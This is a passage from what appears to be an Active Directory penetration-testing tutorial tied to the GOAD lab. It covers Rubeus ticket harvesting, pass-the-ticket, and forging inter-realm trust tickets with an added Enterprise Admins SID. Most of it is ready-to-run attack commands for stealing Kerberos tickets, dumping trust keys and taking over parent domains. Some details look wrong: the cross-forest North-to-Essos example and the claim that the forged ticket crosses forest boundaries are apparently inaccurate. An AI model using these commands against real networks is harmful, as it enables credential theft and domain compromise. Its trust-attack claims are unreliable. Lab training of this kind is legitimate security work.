Beyond requesting tickets on demand, Rubeus can monitor the current host for *new* Kerberos tickets as users log in. This is effective on shared systems (jump boxes, terminal servers) where multiple domain accounts authenticate and their tickets land in memory.

```
# Harvest new tickets every 30 seconds — prints any TGT that appears
.\Rubeus.exe harvest /interval:30

# Harvest and save all captured tickets to disk
.\Rubeus.exe harvest /interval:30 /outfolder:C:\loot\

# Monitor a specific LUID for ticket changes
.\Rubeus.exe harvest /interval:10 /nowrap

# What to do with harvested tickets:
# 1. Import high-value TGT (e.g., DA account logged into jump box)
.\Rubeus.exe ptt /ticket:[base64 from harvest output]

# 2. Verify import
klist

# 3. Access domain resources as that user
dir \\dc01\C$
```

## Cross-Domain Kerberos Trust Ticket Attack

In multi-domain forests (like GOAD's North/Essos/Meereen setup), Kerberos inter-realm trust keys enable cross-domain escalation. With a domain's KRBTGT hash and the trust key, you can forge an inter-realm ticket that grants access to the parent/trusting domain. This is the Kerberos equivalent of a Golden Ticket that crosses forest boundaries.

```
# Step 1: Get the inter-domain trust key (requires DA in child domain)
# secretsdump shows it as: [domain]$@[parent] with aesKey or rc4

impacket-secretsdump child.domain.local/administrator@child-dc \
  -just-dc-ntlm

# The trust account: CHILD$@PARENT — its hash is the trust key

# Step 2: Create a referral ticket using Rubeus (Windows)
.\Rubeus.exe golden \
  /rc4:[trust-key-hash] \
  /user:Administrator \
  /domain:child.domain.local \
  /sid:S-1-5-21-[child-domain-sid] \
  /sids:S-1-5-21-[parent-domain-sid]-519 \
  /service:krbtgt \
  /target:parent.domain.local \
  /nowrap

# /sids parameter adds the parent's Enterprise Admins SID (519)
# This grants Enterprise Admin in the parent domain

# Step 3: Request a TGT in the parent domain using the referral ticket
.\Rubeus.exe asktgs \
  /ticket:[referral-ticket] \
  /service:krbtgt/parent.domain.local \
  /dc:parent-dc.parent.domain.local \
  /ptt

# GOAD example — North → Essos trust escalation:
# After compromising north.sevenkingdoms.local and obtaining trust key:
.\Rubeus.exe asktgs \
  /ticket:[north-referral-tgt] \
  /service:krbtgt/essos.local \
  /dc:meereen.essos.local \
  /ptt

# Verify access to Essos domain
dir \\meereen.essos.local\C$
```
